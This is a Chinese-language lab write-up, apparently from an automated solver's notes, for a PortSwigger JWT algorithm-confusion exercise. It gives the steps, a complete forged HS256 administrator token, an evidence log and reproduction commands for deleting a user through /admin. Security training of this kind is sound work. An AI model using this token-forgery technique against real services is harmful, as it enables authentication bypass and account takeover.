---
title: "lab-jwt-authentication-bypass-via-algorithm-confusion"
links:
  - target: jwt-family
    relation: evidences
---

# lab-jwt-authentication-bypass-via-algorithm-confusion

> evidences: [[jwt-family]]

- 题面:JWT authentication bypass via algorithm confusion(/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
- 实例:https://0a94001803ec743d8aa1307a00c00096.web-security-academy.net
- 判定目标:取服务端公钥,伪造会话令牌进入 admin 面板并删除 carlos

## 关键步

1. `GET /jwks.json` → RSA `n`/`e`,`kid=817a3dc9-18b7-446f-8bff-dc92b654035b`。
2. 登录 `wiener:peter` → `session` 为 RS256 JWT(header `alg:RS256`,`kid`;payload `sub:wiener`)。
3. 新件 `jwt`:把 JWKS 转 SPKI PEM(`jwt pubkey`),再以该 PEM 为 HMAC 密钥伪造 HS256 令牌
   (`jwt forge … administrator --kid …`)→ `{"alg":"HS256","kid":…,"typ":"JWT"}` / `{"sub":"administrator","exp":9999999999}`。
4. 以 `Cookie: session=<伪造令牌>` 访问 `/admin` → 200(导航 `?id=administrator`);
   `GET /admin/delete?username=carlos` → 302 回 `/admin`。

## 交册值

HS256 伪造令牌(以公钥 PEM 作密钥),`sub=administrator`:
`eyJhbGciOiJIUzI1NiIsImtpZCI6IjgxN2EzZGM5LTE4YjctNDQ2Zi04YmZmLWRjOTJiNjU0MDM1YiIsInR5cCI6IkpXVCJ9.eyJleHAiOjk5OTk5OTk5OTksInN1YiI6ImFkbWluaXN0cmF0b3IifQ.Wn0TRrukBwyyCdQbiIGaxN7cpf2CC0F8N1b9rV1c-hE`

## 证据摘录

```
GET /jwks.json -> {"keys":[{"kty":"RSA","e":"AQAB","kid":"817a3dc9-…","n":"onmf/Cn6…"}]}
login wiener:peter -> session=<RS256 JWT sub=wiener>
jwt forge /tmp/b3-2-jwks.json administrator --kid 817a3dc9-… -> <HS256 token sub=administrator>
GET /admin (Cookie: session=<token>) -> 200, nav "/my-account?id=administrator"
GET /admin/delete?username=carlos (same Cookie) -> 302 -> /admin
solved_check / -> {"solved":true,"congrats_line":"<h4>Congratulations, you solved the lab!</h4>"}
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion" --out /tmp/b3-2.html
lab_launch launch <lab_id> --widget-source /web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion --jar /tmp/mar-jar.json
lab_http get  "<inst>/jwks.json" --out /tmp/b3-2-jwks.json
lab_http post "<inst>/login" --form csrf=<csrf> --form username=wiener --form password=peter --follow --jar /tmp/mar-jar.json
jwt pubkey /tmp/b3-2-jwks.json --out /tmp/b3-2-pub.pem
jwt forge  /tmp/b3-2-jwks.json administrator --kid <kid> --out /tmp/b3-2-token
lab_http get "<inst>/admin" --header "Cookie: session=$(cat /tmp/b3-2-token)" --jar /tmp/mar-jar.json
lab_http get "<inst>/admin/delete?username=carlos" --header "Cookie: session=<token>" --follow
solved_check "<inst>/" --jar /tmp/mar-jar.json
```

新件:`jwt`(decode / pubkey(JWKS→SPKI PEM)/ forge(HS256,以公钥 PEM 为密钥))。题面经 `lab_page` 读取(已剥离 solution)。
